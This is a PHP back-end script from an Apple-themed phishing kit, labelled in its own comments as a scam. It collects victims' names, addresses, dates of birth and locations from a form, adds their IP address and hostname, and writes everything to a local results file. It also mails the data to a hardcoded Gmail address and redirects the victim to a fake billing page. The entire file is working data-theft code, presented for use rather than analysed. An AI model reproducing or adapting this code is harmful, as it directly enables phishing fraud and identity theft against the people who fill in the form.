<?php

error_reporting(0);

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "[~]Scam By Unknown (Info Rezult)[~]<br />";
$message .= "|First Name: ".$_POST['Anonisma-1']."<br />";
$message .= "|Last Name: ".$_POST['Anonisma-2']."<br />";
$message .= "|Address: ".$_POST['Anonisma-4']."<br />";
$message .= "|Date Of Birth   : ".$_POST['Anonisma-3']."<br />";
$message .= "|City  : ".$_POST['Anonisma-5']."<br />";
$message .= "|Postal Code : ".$_POST['Anonisma-6']."<br />";
$message .= "|State     : ".$_POST['Anonisma-7']."<br />";
$message .= "|Country     : ".$_POST['Anonisma-8']."<br />";
$message .= "|---------------|Info|-------------------|<br />";
$message .= "|Client IP: ".$ip."<br />";
$message .= "|HostName : ".$hostname."<br />";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----<br />";
$message .= "[~]Scam By Unknown (Info Rezult)[~]<br />";
$send = "bouha51@gmail.com";
$subject = "~ Info Rezult ~| $ip";



$open_rezult_file = fopen("../apple_rezult.html","a"); // spam rezult in file okkkkkk becarful
fwrite($open_rezult_file,$message); // spam rezult in file okkkkkk becarful
include"../cssisma/applejava.php"; // Javascript file to protect scam becarful
mail("$send", "$subject", $message);     
echo '<META http-equiv="refresh" content="0;URL=../billing.html"> ';
?>